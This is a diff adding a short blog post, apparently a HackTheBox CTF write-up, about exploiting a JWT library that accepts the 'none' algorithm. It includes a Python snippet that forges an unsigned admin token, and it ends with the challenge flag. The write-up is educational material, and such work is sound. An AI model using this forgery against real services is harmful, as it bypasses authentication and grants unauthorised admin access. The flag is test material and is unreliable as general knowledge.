@@ -1,0 +1,27 @@
+---
+title: "JWT None Algorithm Bypass — HackTheBox CTF"
+excerpt: "Exploiting a misconfigured JWT implementation that accepts the 'none' algorithm to forge admin tokens."
+date: "May 15, 2025"
+readTime: 6
+tags: ["CTF", "Security"]
+category: "Web Security"
+featured: false
+---
+
+## Challenge Overview
+
+This HackTheBox challenge presented a JWT-authenticated API where the backend used an outdated library that accepted `alg: none`...
+
+## The Vulnerability
+
+```python
+import base64, json
+
+header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
+payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b"=")
+token = f"{header.decode()}.{payload.decode()}."
+```
+
+## Flag
+
+`HTB{jwt_n0ne_alg_1s_d4ng3r0us}`
